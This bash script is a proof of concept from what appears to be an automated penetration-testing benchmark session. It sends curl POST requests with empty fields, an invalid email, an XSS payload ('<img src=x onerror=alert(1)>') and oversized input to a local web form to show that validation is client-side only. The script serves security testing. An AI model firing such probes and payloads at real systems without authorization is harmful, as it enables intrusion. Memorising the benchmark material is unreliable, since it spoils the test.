#!/bin/bash
# POC: Demonstrates client-side validation bypass by sending POST requests with empty fields, invalid email, XSS payload, and oversized input directly to the server
# Target: ./repo
# Created: 2025-11-05T17:26:33.750Z
# Session: benchmark-XBEN-026-24-mhm9hrna

# Client-Side Validation Bypass POC
# Tests that the server accepts POST requests bypassing client-side validation

TARGET="${1:-http://localhost}"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Empty required fields
echo "[Test 1] Sending POST with empty required fields..."
RESPONSE1=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET" \
  -d 'name=&email=&message=')
HTTP_CODE1=$(echo "$RESPONSE1" | grep "HTTP_CODE:" | cut -d: -f2)
echo "Response HTTP Code: $HTTP_CODE1"
if [ "$HTTP_CODE1" = "200" ]; then
  echo "✓ VULNERABLE: Server accepted empty required fields"
else
  echo "✗ Server rejected empty fields with HTTP $HTTP_CODE1"
fi
echo ""

# Test 2: Invalid email format (missing @ and domain)
echo "[Test 2] Sending POST with invalid email format..."
RESPONSE2=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET" \
  -d 'name=John&email=notanemail&message=hello')
HTTP_CODE2=$(echo "$RESPONSE2" | grep "HTTP_CODE:" | cut -d: -f2)
echo "Response HTTP Code: $HTTP_CODE2"
if [ "$HTTP_CODE2" = "200" ]; then
  echo "✓ VULNERABLE: Server accepted invalid email format"
else
  echo "✗ Server rejected invalid email with HTTP $HTTP_CODE2"
fi
echo ""

# Test 3: XSS payload in name field
echo "[Test 3] Sending POST with XSS payload in name field..."
RESPONSE3=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET" \
  -d 'name=<img src=x onerror=alert(1)>&email=test@test.com&message=test')
HTTP_CODE3=$(echo "$RESPONSE3" | grep "HTTP_CODE:" | cut -d: -f2)
echo "Response HTTP Code: $HTTP_CODE3"
if [ "$HTTP_CODE3" = "200" ]; then
  echo "✓ VULNERABLE: Server accepted XSS payload without validation"
else
  echo "✗ Server rejected XSS payload with HTTP $HTTP_CODE3"
fi
echo ""

# Test 4: Large input (10K characters) - testing for length validation
echo "[Test 4] Sending POST with large input (10K characters)..."
LARGE_INPUT=$(python3 -c "print('A' * 10000)")
RESPONSE4=$(curl -s -w "\nHTTP_CODE:%{http_code}" -X POST "$TARGET" \
  -d "name=$LARGE_INPUT&email=test@test.com&message=test")
HTTP_CODE4=$(echo "$RESPONSE4" | grep "HTTP_CODE:" | cut -d: -f2)
echo "Response HTTP Code: $HTTP_CODE4"
if [ "$HTTP_CODE4" = "200" ]; then
  echo "✓ VULNERABLE: Server accepted oversized input without length validation"
else
  echo "✗ Server rejected large input with HTTP $HTTP_CODE4"
fi
echo ""

# Summary
echo "=== SUMMARY ==="
VULNCOUNT=0
[ "$HTTP_CODE1" = "200" ] && ((VULNCOUNT++))
[ "$HTTP_CODE2" = "200" ] && ((VULNCOUNT++))
[ "$HTTP_CODE3" = "200" ] && ((VULNCOUNT++))
[ "$HTTP_CODE4" = "200" ] && ((VULNCOUNT++))

echo "Vulnerable tests: $VULNCOUNT/4"
if [ $VULNCOUNT -ge 2 ]; then
  echo "✓ Client-side validation bypass CONFIRMED"
  exit 0
else
  echo "✗ Insufficient evidence of validation bypass"
  exit 1
fi